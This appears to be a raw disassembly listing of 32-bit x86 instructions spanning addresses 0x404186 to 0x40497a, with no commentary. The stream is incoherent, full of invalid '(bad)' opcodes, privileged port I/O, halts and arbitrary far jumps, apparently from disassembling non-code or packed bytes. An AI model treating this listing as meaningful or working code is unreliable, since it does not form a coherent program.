  404186:	pop    edi
  404187:	mov    ecx,?
  404189:	aaa    
  40418a:	gs xor ebp,edi
  40418d:	test   bl,dl
  40418f:	ret    
  404190:	mul    BYTE PTR [eax]
  404192:	les    esi,FWORD PTR [ebp+0x890913a]
  404198:	pop    edx
  404199:	shr    BYTE PTR [edi+0x3fd73fc3],1
  40419f:	jne    0x404127
  4041a1:	in     al,dx
  4041a2:	sahf   
  4041a3:	cmp    al,0x90
  4041a5:	mov    edi,0xb7206881
  4041aa:	push   ecx
  4041ab:	jo     0x404207
  4041ad:	es adc al,0x90
  4041b0:	leave  
  4041b1:	mov    esp,0x9b14c658
  4041b6:	mov    cl,0xef
  4041b8:	cmp    DWORD PTR [esi-0x7f],ecx
  4041bb:	mov    ch,0x98
  4041bd:	mov    bh,0x58
  4041bf:	inc    edx
  4041c0:	mov    BYTE PTR [eax-0x5f],ah
  4041c3:	test   al,0xbc
  4041c5:	cmp    eax,DWORD PTR [ebp+0x7d]
  4041c8:	stos   DWORD PTR es:[edi],eax
  4041c9:	out    0xa3,al
  4041cb:	mov    ah,0xfb
  4041cd:	fld    QWORD PTR ds:0x3a758327
  4041d3:	inc    esp
  4041d4:	popf   
  4041d5:	add    BYTE PTR [edi+0x7f],al
  4041d8:	pop    ecx
  4041d9:	test   DWORD PTR [eax],edi
  4041db:	sbb    DWORD PTR [ecx-0x57],esp
  4041de:	cmc    
  4041df:	aad    0x7a
  4041e1:	cmp    DWORD PTR [eax-0x15],0x3e
  4041e5:	cmp    al,0xb4
  4041e7:	retf   0x23f4
  4041ea:	int    0xc2
  4041ec:	ret    
  4041ed:	dec    esi
  4041ee:	and    ebx,DWORD PTR [esi+0x2df6f6bc]
  4041f4:	in     eax,dx
  4041f5:	enter  0x383e,0xf0
  4041f9:	(bad)  
  4041fb:	pop    edi
  4041fc:	inc    ebx
  4041fd:	sub    al,0x49
  4041ff:	jae    0x4041c3
  404201:	in     eax,dx
  404202:	mov    dh,0x59
  404204:	mov    dl,0xa7
  404206:	loope  0x4041e8
  404208:	addr16 pop eax
  40420a:	aaa    
  40420b:	aam    0x9
  40420d:	icebp  
  40420e:	xor    BYTE PTR [ebx+0x36],0x8e
  404212:	and    eax,0x5e2701ff
  404217:	dec    ebx
  404218:	or     eax,0x65cffb1f
  40421d:	jmp    0xce52:0xfd4e405c
  404224:	and    eax,0xd1bf0856
  404229:	ins    DWORD PTR es:[edi],dx
  40422a:	mov    bl,0x1a
  40422c:	pop    es
  40422d:	cmp    cl,dh
  40422f:	in     al,0x91
  404231:	shl    DWORD PTR ds:0x166517dd,cl
  404237:	not    BYTE PTR [edi+0x17]
  40423a:	(bad)  
  40423b:	out    0xd5,al
  40423d:	out    dx,al
  40423e:	jge    0x4041ff
  404240:	(bad)  
  404241:	jge    0x4041cf
  404243:	stos   BYTE PTR es:[edi],al
  404244:	scas   al,BYTE PTR es:[edi]
  404245:	mov    edx,0xecc1160f
  40424a:	outs   dx,DWORD PTR ds:[esi]
  40424b:	ins    BYTE PTR es:[edi],dx
  40424c:	fmulp  st(5),st
  40424e:	lahf   
  40424f:	cmp    si,WORD PTR [esi+0x4554bfa8]
  404256:	lods   eax,DWORD PTR ds:[esi]
  404257:	sub    eax,0x7b4569c3
  40425c:	xchg   BYTE PTR [esp+ebp*1+0xc9d415b],ah
  404263:	mov    ds:0xde95852f,al
  404268:	xor    eax,0x6bb46c2c
  40426d:	cmp    edi,esi
  40426f:	out    0x8e,al
  404271:	lods   eax,DWORD PTR ds:[esi]
  404272:	or     DWORD PTR ds:0x17886458,ebx
  404278:	mov    ch,BYTE PTR [esi]
  40427a:	bound  eax,QWORD PTR [ebx+0x695eddd1]
  404280:	shr    BYTE PTR [ecx],1
  404282:	mov    ebp,0x3856f721
  404287:	fisub  DWORD PTR [edi-0x70]
  40428a:	push   esp
  40428b:	ins    DWORD PTR es:[edi],dx
  40428c:	jno    0x4042bb
  40428e:	aaa    
  40428f:	loopne 0x40428c
  404291:	loopne 0x40425d
  404293:	mov    eax,0x51efb02a
  404298:	sahf   
  404299:	jge    0x404257
  40429b:	cdq    
  40429c:	loopne 0x404307
  40429e:	bound  eax,QWORD PTR [esi-0x35859be7]
  4042a4:	push   ecx
  4042a5:	jp     0x40422a
  4042a7:	cmp    bh,bh
  4042a9:	scas   al,BYTE PTR es:[edi]
  4042aa:	or     BYTE PTR [edx],cl
  4042ac:	add    eax,DWORD PTR [eax+ecx*4-0x77]
  4042b0:	(bad)  
  4042b2:	imul   edx,ebx,0xfffffffd
  4042b5:	jp     0x404287
  4042b7:	fdivr  st(3),st
  4042b9:	loopne 0x4042d0
  4042bb:	push   esp
  4042bc:	cmp    al,BYTE PTR [edx-0x5b]
  4042bf:	leave  
  4042c0:	add    DWORD PTR [ebx],ecx
  4042c2:	cmp    al,0x97
  4042c4:	lods   eax,DWORD PTR ds:[esi]
  4042c5:	mov    edx,0x6fb09bd2
  4042ca:	jp     0x4042d2
  4042cc:	jecxz  0x40430a
  4042ce:	mov    ebx,0xeb1ad90f
  4042d3:	adc    esi,DWORD PTR [esi]
  4042d5:	add    al,0x46
  4042d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d8:	nop
  4042d9:	icebp  
  4042da:	mov    WORD PTR [edx+0x24],cs
  4042dd:	data16 std 
  4042df:	test   BYTE PTR [ebx+0x26920be1],ah
  4042e5:	xchg   cx,ax
  4042e7:	pop    ds
  4042e8:	mov    ds:0xcd2ed882,al
  4042ed:	xchg   ah,bh
  4042ef:	inc    esi
  4042f0:	int3   
  4042f1:	pop    ebx
  4042f2:	dec    esp
  4042f3:	inc    edx
  4042f4:	sub    al,0x2d
  4042f6:	jge    0x4042ad
  4042f8:	(bad)
  4042fb:	pop    edx
  4042fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042fd:	or     edi,eax
  4042ff:	mov    esp,0x6a658ed8
  404304:	pop    edx
  404305:	adc    DWORD PTR [ecx+0x7c],ebp
  404308:	or     BYTE PTR [esi-0x1966cd31],ah
  40430e:	push   esp
  40430f:	test   DWORD PTR [edi],0xdad0ba6d
  404315:	test   DWORD PTR [ebp-0x141e47c3],esi
  40431b:	or     al,0x4d
  40431d:	pushf  
  40431e:	dec    ebx
  40431f:	pushf  
  404320:	mov    ecx,DWORD PTR [edi-0xf11e313]
  404326:	frstor [edi+0x655bbf48]
  40432c:	mov    ebp,esp
  40432e:	sub    BYTE PTR [edx-0x2d49246f],dl
  404334:	adc    al,0x3a
  404336:	stc    
  404337:	shr    DWORD PTR [di-0x14],cl
  40433b:	inc    esp
  40433c:	(bad)  
  40433d:	lock sub eax,0xe9d44fce
  404343:	fsubr  QWORD PTR [ecx]
  404345:	dec    eax
  404346:	in     al,dx
  404347:	push   cs
  404348:	jmp    0x10ab1b3c
  40434d:	dec    edx
  40434e:	pop    esp
  40434f:	or     ah,BYTE PTR [esi]
  404351:	mov    ch,0x6a
  404353:	jbe    0x404339
  404355:	lds    eax,FWORD PTR [ebx]
  404357:	fisub  DWORD PTR [edx+0x27f7cf98]
  40435d:	ja     0x404387
  40435f:	dec    edi
  404360:	inc    edi
  404361:	loop   0x404337
  404363:	popa   
  404364:	cs xor bl,ch
  404367:	push   ds
  404368:	dec    eax
  404369:	add    al,0x40
  40436b:	inc    ebp
  40436c:	loope  0x404379
  40436e:	or     al,0x6d
  404370:	jns    0x40438a
  404372:	or     DWORD PTR ds:0x7fccd327,ebx
  404378:	pop    ebp
  404379:	lods   eax,DWORD PTR ds:[esi]
  40437a:	and    eax,0x1a4a9d7b
  40437f:	pop    esp
  404380:	dec    esi
  404381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404382:	xor    dl,bl
  404384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404385:	les    ebx,FWORD PTR [ecx-0x1f96e4d4]
  40438b:	mov    eax,0xbbc33db7
  404390:	jne    0x40433f
  404392:	mov    ?,ebp
  404394:	mov    dl,0x19
  404396:	sahf   
  404397:	dec    ecx
  404398:	ret    
  404399:	test   DWORD PTR [ecx-0x1e],ebx
  40439c:	fiadd  DWORD PTR [esi+ebx*1]
  40439f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043a0:	and    esp,DWORD PTR [ebx]
  4043a2:	xchg   ebx,eax
  4043a3:	imul   esp,eax,0xa017b168
  4043a9:	xor    DWORD PTR [ebp+0x18ee168d],esp
  4043af:	(bad)  
  4043b0:	shr    BYTE PTR [eax],cl
  4043b2:	dec    esi
  4043b3:	int    0x35
  4043b5:	inc    eax
  4043b6:	(bad)  
  4043b8:	mov    eax,ds:0x6a64859e
  4043bd:	add    dh,BYTE PTR ds:0x5b1a6245
  4043c3:	outs   dx,DWORD PTR ds:[esi]
  4043c4:	push   ss
  4043c5:	sbb    ebx,DWORD PTR [esp+edi*8+0x77]
  4043c9:	mov    eax,ds:0x19eab32f
  4043ce:	into   
  4043cf:	pop    esi
  4043d0:	lds    esi,FWORD PTR [esi]
  4043d2:	sar    edx,cl
  4043d4:	inc    edx
  4043d5:	sahf   
  4043d6:	scas   al,BYTE PTR es:[edi]
  4043d7:	fistp  WORD PTR [ebp+0x2d]
  4043da:	clc    
  4043db:	mov    ?,WORD PTR [edx+esi*2]
  4043de:	inc    ecx
  4043df:	xchg   ecx,eax
  4043e0:	in     al,dx
  4043e1:	and    al,0xea
  4043e3:	jge    0x404410
  4043e5:	ror    BYTE PTR [ebp-0x12],1
  4043e8:	outs   dx,DWORD PTR ds:[esi]
  4043e9:	loop   0x40444c
  4043eb:	jnp    0x404423
  4043ed:	cld    
  4043ee:	jmp    0xdf7d:0x7d3d6132
  4043f5:	or     al,0x7e
  4043f7:	add    DWORD PTR [ebx-0x3c],0xe6624768
  4043fe:	xchg   edi,eax
  4043ff:	sub    al,0x2d
  404401:	mov    esi,0x38a3f502
  404406:	fcomp  QWORD PTR [esi-0x60bbdd0a]
  40440c:	mov    ecx,0xa72edeca
  404411:	push   esi
  404412:	fucomip st,st(2)
  404414:	scas   al,BYTE PTR es:[edi]
  404415:	shr    BYTE PTR [ecx-0x1e],0x7a
  404419:	inc    esi
  40441a:	sub    edi,eax
  40441c:	mov    ds:0x7f38d8de,al
  404421:	pop    ecx
  404422:	xchg   ecx,eax
  404423:	retf   0x53cf
  404426:	sbb    al,0x72
  404428:	dec    esi
  404429:	push   DWORD PTR [edi]
  40442b:	dec    edi
  40442c:	cdq    
  40442d:	xchg   ecx,eax
  40442e:	jnp    0x404444
  404430:	mov    eax,0x99b881fd
  404435:	dec    esp
  404436:	inc    edi
  404437:	cmp    eax,0x4f2180b2
  40443c:	pop    eax
  40443d:	jne    0x4044a9
  40443f:	ret    0xf63d
  404442:	push   ecx
  404443:	xchg   ebp,eax
  404444:	add    BYTE PTR [edi-0x70],dh
  404447:	and    al,0xc
  404449:	sbb    al,0x11
  40444b:	xchg   al,ah
  40444d:	dec    edx
  40444e:	jl     0x40444d
  404450:	and    esp,ebp
  404452:	arpl   WORD PTR [esi],dx
  404454:	xchg   edx,eax
  404455:	outs   dx,DWORD PTR ds:[esi]
  404456:	add    ch,BYTE PTR [esi+0x6c69a5c9]
  40445c:	out    dx,eax
  40445d:	mov    al,ds:0x440712b1
  404462:	adc    BYTE PTR ds:0x7d7a9949,dh
  404468:	mov    ?,WORD PTR [edi]
  40446a:	mov    ds:0xf6ec6e58,al
  40446f:	cmp    ch,ch
  404471:	and    al,0xde
  404473:	cmp    DWORD PTR [edx],ebp
  404475:	scas   al,BYTE PTR es:[edi]
  404476:	mov    ebp,0x63ef6527
  40447b:	jne    0x40443a
  40447d:	nop
  40447e:	adc    eax,DWORD PTR [esi-0x589042f8]
  404484:	jnp    0x4044ac
  404486:	xor    bh,BYTE PTR [esi]
  404488:	xchg   ecx,eax
  404489:	ret    0x2f7e
  40448c:	sar    DWORD PTR [esi-0x2f6154cf],0xda
  404493:	je     0x404451
  404495:	adc    al,0x7d
  404497:	loopne 0x404492
  404499:	xchg   esp,eax
  40449a:	rol    DWORD PTR [ebx+0x27],1
  40449d:	jl     0x40450e
  40449f:	dec    bx
  4044a1:	add    eax,0x24c3c5ca
  4044a6:	pop    edi
  4044a7:	in     eax,0xfa
  4044a9:	stc    
  4044aa:	das    
  4044ab:	dec    edi
  4044ac:	and    eax,0x23ecf8bd
  4044b1:	xchg   esi,eax
  4044b2:	and    eax,0x6d52b34
  4044b7:	pop    ecx
  4044b8:	sub    al,0x64
  4044ba:	sar    ebp,1
  4044bc:	aam    0x7c
  4044be:	cmc    
  4044bf:	add    al,0x48
  4044c1:	jle    0x404523
  4044c3:	cld    
  4044c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c5:	ss icebp 
  4044c7:	rcr    DWORD PTR [eax-0x4b9e1e30],cl
  4044cd:	popa   
  4044ce:	xor    al,BYTE PTR [eax-0x4de7977f]
  4044d4:	xchg   BYTE PTR [eax+0x43],dl
  4044d7:	aas    
  4044d8:	sbb    eax,0xe4ae5a99
  4044dd:	cmp    BYTE PTR [ebx],ah
  4044df:	pop    ebx
  4044e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044e1:	fisub  DWORD PTR [ecx-0x232ce406]
  4044e7:	adc    eax,0xd6d5ffca
  4044ec:	and    eax,0x1624d0c4
  4044f1:	pop    edi
  4044f2:	arpl   si,bx
  4044f4:	cmp    al,0x31
  4044f6:	les    eax,FWORD PTR [ecx]
  4044f8:	mov    ah,BYTE PTR [eax]
  4044fa:	stos   BYTE PTR es:[edi],al
  4044fb:	add    BYTE PTR [esi+0x18503011],cl
  404501:	out    dx,al
  404502:	xor    ebp,DWORD PTR [esi]
  404504:	sahf   
  404505:	repz (bad) 
  404507:	jmp    0x6a64:0x3b447f48
  40450e:	jae    0x40455e
  404510:	jle    0x4044c4
  404512:	int    0x2c
  404514:	jmp    0x4f68:0x6ff02877
  40451b:	stc    
  40451c:	call   0x8ecf:0xf33f0b60
  404523:	cmp    BYTE PTR [edx-0x3da4e0d9],dh
  404529:	sti    
  40452a:	and    BYTE PTR [esp+esi*4+0x66],ah
  40452e:	icebp  
  40452f:	in     eax,dx
  404530:	jge    0x404503
  404532:	loope  0x4044df
  404534:	sbb    bl,dl
  404536:	push   eax
  404537:	(bad)  
  404539:	xchg   edi,eax
  40453a:	outs   dx,BYTE PTR ds:[esi]
  40453b:	sbb    DWORD PTR [eax-0x5e],ebx
  40453e:	hlt    
  40453f:	idiv   esi
  404541:	retf   
  404542:	retf   0x76dc
  404545:	out    dx,al
  404546:	mov    dh,BYTE PTR [ecx-0x32c2762e]
  40454c:	mov    dl,0x12
  40454e:	jno    0x404596
  404550:	push   edi
  404551:	push   esp
  404552:	jl     0x4045d3
  404554:	cmp    DWORD PTR [ebp-0x5],eax
  404557:	or     DWORD PTR [ecx+0x1b],edx
  40455a:	mov    ds:0xe950005,eax
  40455f:	aad    0x4d
  404561:	dec    esp
  404562:	mov    edx,0x3c62e54c
  404567:	pop    ds
  404568:	and    DWORD PTR [edx+edi*4-0x135bf137],edx
  40456f:	ins    DWORD PTR es:[edi],dx
  404570:	jl     0x4045da
  404572:	sbb    DWORD PTR [ebp+0x7d],ecx
  404575:	ror    ah,cl
  404577:	popa   
  404578:	je     0x40458e
  40457a:	adc    DWORD PTR [ebp+0x2c4ef431],ecx
  404580:	adc    ch,BYTE PTR [edi+0x58]
  404583:	and    al,0xa3
  404585:	iret   
  404586:	sar    ebp,cl
  404588:	js     0x40455f
  40458a:	push   eax
  40458b:	mov    edx,0x2f76e294
  404590:	mov    bl,0x19
  404592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404593:	sub    al,0x84
  404595:	push   ecx
  404596:	mov    ds:0xa105994e,al
  40459b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40459c:	mov    bl,0xa7
  40459e:	ja     0x404559
  4045a0:	push   esp
  4045a1:	jmp    0x4dbb:0x49902b9a
  4045a8:	mov    edx,0x89ed56b0
  4045ad:	mov    al,ds:0xacc775fa
  4045b2:	cdq    
  4045b3:	inc    ebx
  4045b4:	fistp  DWORD PTR [edx-0x63ea6210]
  4045ba:	mov    al,ds:0xefaef856
  4045bf:	daa    
  4045c0:	xor    esp,esp
  4045c2:	mov    al,ds:0x8eb42d28
  4045c7:	sub    eax,0x46c6c5fa
  4045cc:	jo     0x404646
  4045ce:	icebp  
  4045cf:	add    BYTE PTR [edi+0x6d],dh
  4045d2:	sbb    al,0xa8
  4045d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d5:	daa    
  4045d6:	test   al,0xf5
  4045d8:	inc    eax
  4045d9:	fistp  WORD PTR [ecx-0x36]
  4045dc:	sub    eax,0xb90e0975
  4045e1:	pop    DWORD PTR [ecx-0xe48844d]
  4045e7:	out    0x2d,al
  4045e9:	std    
  4045ea:	je     0x40464c
  4045ec:	lds    ecx,FWORD PTR [esp+ecx*2+0x1c]
  4045f0:	fs pop es
  4045f2:	rcl    DWORD PTR [ebx+0x353bea31],cl
  4045f8:	pop    edi
  4045f9:	pop    ds
  4045fa:	or     BYTE PTR [ebx-0x66],dh
  4045fd:	imul   eax,ebx,0xc89cd890
  404603:	ss enter 0x8541,0x6f
  404608:	in     al,dx
  404609:	or     dh,BYTE PTR [ebp-0x7b661fb0]
  40460f:	sahf   
  404610:	fbstp  TBYTE PTR [ebp+0x2f6789ef]
  404616:	mov    al,0x8d
  404618:	das    
  404619:	xchg   ecx,eax
  40461a:	jge    0x40465e
  40461c:	out    dx,eax
  40461d:	mov    eax,0x229685aa
  404622:	jno    0x4045e4
  404624:	dec    esp
  404625:	fisub  DWORD PTR [ecx+0x49]
  404628:	xchg   DWORD PTR [ebx],edi
  40462a:	xchg   ebp,eax
  40462b:	inc    ebp
  40462c:	pop    ebx
  40462d:	das    
  40462e:	or     al,0x77
  404630:	imul   esi,DWORD PTR [ebp+esi*8+0x37],0x43fcc15d
  404638:	popf   
  404639:	test   BYTE PTR [edx-0x125a30d9],bh
  40463f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404640:	test   eax,0xa5acfb37
  404645:	imul   ecx,DWORD PTR [edi+0x2d9e5ff9],0x43167c53
  40464f:	dec    esi
  404650:	das    
  404651:	fsubr  DWORD PTR [ecx+0xc]
  404654:	push   ebx
  404655:	bts    DWORD PTR [eax-0x49897f0c],0x19
  40465d:	mov    edi,edi
  40465f:	imul   ebp,DWORD PTR [ecx-0x1d],0xfffffffb
  404663:	pop    edi
  404664:	in     eax,0x49
  404666:	push   ss
  404667:	ficom  DWORD PTR [esi+ebx*4+0x65cf4f54]
  40466e:	jge    0x404611
  404670:	pop    ds
  404671:	mov    eax,ds:0x681226a9
  404676:	mov    bl,0x61
  404678:	int    0xb1
  40467a:	mov    ch,0x9
  40467c:	popa   
  40467d:	aad    0xb9
  40467f:	sbb    al,0x9f
  404681:	aam    0xca
  404683:	and    ebp,DWORD PTR [esi+0xe]
  404686:	fiadd  WORD PTR [esi+0x58d810ac]
  40468c:	test   eax,0x15febeaa
  404691:	aam    0xd6
  404693:	inc    edx
  404694:	mov    eax,0x244f7275
  404699:	or     al,0xf2
  40469b:	mov    bl,0xe2
  40469d:	test   BYTE PTR [esi],ah
  40469f:	pushf  
  4046a0:	mov    ch,0x58
  4046a2:	push   esp
  4046a3:	pop    ebp
  4046a4:	inc    edx
  4046a5:	dec    eax
  4046a6:	stos   DWORD PTR es:[edi],eax
  4046a7:	xor    DWORD PTR [esi-0x71],esi
  4046aa:	mov    DWORD PTR [edi+0x71fd5549],ebp
  4046b0:	jne    0x4046b2
  4046b2:	cs popf 
  4046b4:	sub    edi,DWORD PTR [esi]
  4046b6:	xchg   BYTE PTR [edi-0x2f],ch
  4046b9:	sbb    DWORD PTR [esi+0x1426526a],ecx
  4046bf:	ins    DWORD PTR es:[edi],dx
  4046c0:	sahf   
  4046c1:	pop    ss
  4046c2:	push   ds
  4046c3:	mov    ds:0xd41c9c20,eax
  4046c8:	imul   ebx,edi,0xffffffc1
  4046cb:	dec    edx
  4046cc:	inc    esp
  4046cd:	jg     0x4046d0
  4046cf:	cmp    bx,WORD PTR [edx+0x50]
  4046d3:	cmp    al,ch
  4046d5:	jb     0x404670
  4046d7:	mov    esi,0xf6166011
  4046dc:	sahf   
  4046dd:	repnz aas 
  4046df:	dec    BYTE PTR [ebp-0x52]
  4046e2:	mov    ebx,0x4aa960c
  4046e7:	mov    bh,BYTE PTR [eax-0x1a46cd26]
  4046ed:	push   es
  4046ee:	ret    
  4046ef:	ret    
  4046f0:	fmul   DWORD PTR [ebp-0x45ac31f0]
  4046f6:	mov    cl,BYTE PTR [ecx-0x48]
  4046f9:	inc    esp
  4046fa:	stc    
  4046fb:	stc    
  4046fc:	shr    al,0xdb
  4046ff:	sub    ecx,DWORD PTR [esi+0x65]
  404702:	js     0x404715
  404704:	xchg   edx,eax
  404705:	jmp    0x4046d1
  404707:	mov    eax,0x3e4a588
  40470c:	xor    al,0x98
  40470e:	ds push cs
  404710:	mov    DWORD PTR [edx],ebp
  404712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404713:	push   ecx
  404714:	pop    es
  404715:	sub    dh,dl
  404717:	mov    ecx,0x4697f180
  40471c:	std    
  40471d:	adc    eax,0x20e802f2
  404722:	lods   eax,DWORD PTR ds:[esi]
  404723:	adc    BYTE PTR [esp+edx*1+0x4dd50bf8],0x2b
  40472b:	lahf   
  40472c:	jne    0x4046eb
  40472e:	nop
  40472f:	inc    edx
  404730:	jnp    0x404768
  404732:	mov    DWORD PTR [edx-0x45505b94],esp
  404738:	mov    dh,0x4e
  40473a:	pop    ecx
  40473b:	push   edx
  40473c:	fiadd  DWORD PTR [eax+0x341d4bf4]
  404742:	pop    esp
  404743:	inc    edx
  404744:	les    ebp,FWORD PTR [esp+eax*1]
  404747:	jmp    0x404777
  404749:	sbb    al,0x16
  40474b:	std    
  40474c:	loopne 0x4046d1
  40474e:	clc    
  40474f:	mov    eax,ds:0x9f272cc
  404754:	cmp    DWORD PTR [esi+0x2],ebx
  404757:	out    dx,al
  404758:	push   es
  404759:	adc    al,0x40
  40475b:	retf   0x521e
  40475e:	jne    0x404774
  404760:	es lahf 
  404762:	test   BYTE PTR [esi+0x7461877b],ah
  404768:	add    DWORD PTR [esi+0x115b58e6],edi
  40476e:	(bad)
  404771:	fs dec eax
  404773:	push   edx
  404774:	mov    ch,0xf6
  404776:	fld    st(4)
  404778:	xlat   BYTE PTR ds:[ebx]
  404779:	fisubr WORD PTR [ebx]
  40477b:	pop    edx
  40477c:	bound  ebx,QWORD PTR [ebx]
  40477e:	xchg   ebp,eax
  40477f:	jmp    0x4a17:0x57a14971
  404786:	adc    bl,0x85
  404789:	mov    DWORD PTR [eax+0x39],eax
  40478c:	fiadd  DWORD PTR [esi-0x72]
  40478f:	xor    al,0x89
  404791:	sti    
  404792:	arpl   WORD PTR [edx-0x43b3d259],bp
  404798:	and    ch,BYTE PTR [ecx-0x15]
  40479b:	hlt    
  40479c:	bound  esi,QWORD PTR [eax]
  40479e:	es dec ebp
  4047a0:	imul   ebp,DWORD PTR [edx+0xb],0x1d
  4047a4:	imul   ebp,DWORD PTR [eax-0x74],0x1
  4047a8:	shld   DWORD PTR [ecx-0x54],edx,cl
  4047ac:	fld    QWORD PTR [ebx-0xd]
  4047af:	call   0xd386:0xba7e3bff
  4047b6:	pop    ds
  4047b7:	(bad)  
  4047b8:	cmc    
  4047b9:	mov    ebx,0xbe7d5310
  4047be:	add    eax,0x31458c96
  4047c3:	inc    ecx
  4047c4:	xor    eax,0x2b1f7d54
  4047c9:	push   es
  4047ca:	sbb    DWORD PTR [eax+esi*8],edi
  4047cd:	jecxz  0x40480f
  4047cf:	aad    0xd1
  4047d1:	fsubr  QWORD PTR [eax-0x53]
  4047d4:	mov    cs,WORD PTR es:[edi-0x1eeea1ca]
  4047db:	lahf   
  4047dc:	enter  0x519,0x1a
  4047e0:	add    al,BYTE PTR [ebp+0x18]
  4047e3:	mov    dh,dh
  4047e5:	push   esp
  4047e6:	scas   al,BYTE PTR es:[edi]
  4047e7:	jne    0x40482e
  4047e9:	sub    al,0xcd
  4047eb:	xor    esi,DWORD PTR [ebp+0x2b]
  4047ee:	cli    
  4047ef:	cmp    cl,al
  4047f1:	mov    bl,0x29
  4047f3:	push   0xa44ce414
  4047f8:	ins    BYTE PTR es:[edi],dx
  4047f9:	push   0xd6c68aab
  4047fe:	jg     0x4047f7
  404800:	sbb    al,0xd8
  404802:	daa    
  404803:	jle    0x404811
  404805:	data16 rol BYTE PTR [eax-0x6d],0x16
  40480a:	pop    ds
  40480b:	out    0x64,eax
  40480d:	lea    eax,[ebx-0x16]
  404810:	add    bl,bl
  404812:	dec    eax
  404813:	mov    ecx,0xe3eb8414
  404818:	fwait
  404819:	loopne 0x404823
  40481b:	pop    ss
  40481c:	cmc    
  40481d:	mov    al,ds:0xccf450bb
  404822:	and    al,0x10
  404824:	and    BYTE PTR [edi+0x7],0xdf
  404828:	call   0xfea:0x178b2f5e
  40482f:	mov    ds:0xf1140448,eax
  404834:	pop    edi
  404835:	xor    ah,BYTE PTR [ebp-0x246877e3]
  40483b:	ss je  0x40483f
  40483e:	das    
  40483f:	call   0x1816:0xa31873b0
  404846:	adc    eax,0xa386337c
  40484b:	xchg   esi,eax
  40484c:	call   DWORD PTR [ecx+0x76c3ad6]
  404852:	push   cs
  404853:	data16 jg 0x404889
  404856:	cmc    
  404857:	ss aaa 
  404859:	and    DWORD PTR [ecx-0xc],ebx
  40485c:	jecxz  0x404873
  40485e:	and    eax,0x22845ecf
  404863:	and    BYTE PTR [esi+0x239884f],ah
  404869:	mov    ds:0x69aca14b,eax
  40486e:	out    dx,eax
  40486f:	ins    BYTE PTR es:[edi],dx
  404870:	and    edx,esp
  404872:	or     DWORD PTR [ecx+0x18],0x32
  404876:	pop    ecx
  404877:	xchg   ebp,eax
  404878:	sbb    DWORD PTR [ebx+0x599ace26],ebx
  40487e:	cmp    eax,0xc6e5e03c
  404883:	fidivr WORD PTR [ecx+0x39]
  404886:	xchg   edi,eax
  404887:	hlt    
  404888:	dec    edx
  404889:	xlat   BYTE PTR ds:[ebx]
  40488a:	es push edi
  40488c:	out    0x4e,eax
  40488e:	mov    bh,0x25
  404890:	daa    
  404891:	sub    edx,edx
  404893:	(bad)  
  404894:	fidivr DWORD PTR [ebx-0x41]
  404897:	mov    esp,0xba965579
  40489c:	cmp    dh,BYTE PTR [edx]
  40489e:	arpl   WORD PTR [ebp-0x574e41cc],sp
  4048a4:	cdq    
  4048a5:	sub    eax,0xee239927
  4048aa:	pop    es
  4048ab:	addr16 nop
  4048ad:	or     bx,WORD PTR [edi-0x44]
  4048b1:	jbe    0x404836
  4048b3:	xchg   ebx,eax
  4048b4:	les    esi,FWORD PTR [edx]
  4048b6:	sub    eax,0xd7be4982
  4048bb:	lea    ebx,[edx-0x74]
  4048be:	outs   dx,DWORD PTR ds:[esi]
  4048bf:	or     al,0xe
  4048c1:	and    eax,edi
  4048c3:	sub    BYTE PTR [ecx+0x26],ch
  4048c6:	inc    eax
  4048c7:	push   ecx
  4048c8:	sbb    dh,0x7f
  4048cb:	push   eax
  4048cc:	lock adc eax,DWORD PTR cs:[ecx+0x6f]
  4048d1:	xor    ch,BYTE PTR [edx-0x776adb45]
  4048d7:	mov    eax,0x75853aec
  4048dc:	and    BYTE PTR [edx],ch
  4048de:	push   ss
  4048df:	mov    ds:0xc1397093,eax
  4048e4:	sub    ebp,DWORD PTR [ecx+0x47682ea8]
  4048ea:	mov    BYTE PTR [ecx],dl
  4048ec:	clc    
  4048ed:	stos   DWORD PTR es:[edi],eax
  4048ee:	dec    edi
  4048ef:	inc    eax
  4048f0:	sub    al,0x44
  4048f2:	mov    bl,BYTE PTR [edi-0x74]
  4048f5:	and    DWORD PTR [eax-0x34240dfc],esp
  4048fb:	xchg   edx,eax
  4048fc:	xor    al,0x71
  4048fe:	cmc    
  4048ff:	jo     0x4048ed
  404901:	adc    BYTE PTR [ebx+0xd],cl
  404904:	jmp    FWORD PTR [ecx-0x35]
  404907:	(bad)  
  404908:	pop    ds
  404909:	mov    ah,0x4e
  40490b:	mov    ebp,0xc53aefee
  404910:	add    dl,cl
  404912:	pushf  
  404913:	cld    
  404914:	sbb    edi,DWORD PTR [edx-0x733a9c31]
  40491a:	or     DWORD PTR [edi],eax
  40491c:	and    ch,BYTE PTR [eax+0x5]
  40491f:	jp     0x404968
  404921:	adc    al,0x16
  404923:	stos   BYTE PTR es:[edi],al
  404924:	adc    DWORD PTR [ecx-0x5f],esp
  404927:	(bad)  
  404928:	mov    al,ds:0x220e9a0
  40492d:	test   al,0xb9
  40492f:	push   0xfffffff7
  404931:	hlt    
  404932:	cdq    
  404933:	or     eax,0xdd01c654
  404938:	test   edx,edi
  40493a:	jmp    0x323:0x13131678
  404941:	call   0xd05b662a
  404946:	std    
  404947:	mov    edi,0x1df4f26f
  40494c:	add    DWORD PTR [ebx],edx
  40494e:	shl    ecx,0x3f
  404951:	or     cl,0x96
  404954:	cmp    esi,edi
  404956:	fcmovnu st,st(5)
  404958:	scas   eax,DWORD PTR es:[edi]
  404959:	(bad)  
  40495b:	outs   dx,DWORD PTR ds:[esi]
  40495c:	dec    esi
  40495d:	nop
  40495e:	add    BYTE PTR [ebx+0x7f3ebb02],dl
  404964:	and    dh,BYTE PTR [ecx]
  404966:	push   0x23735f7b
  40496b:	ret    0x2a38
  40496e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40496f:	mov    ds:0xc4ce3187,al
  404974:	sbb    eax,0xbb42d593
  404979:	aas    
  40497a:	or     esi,esi
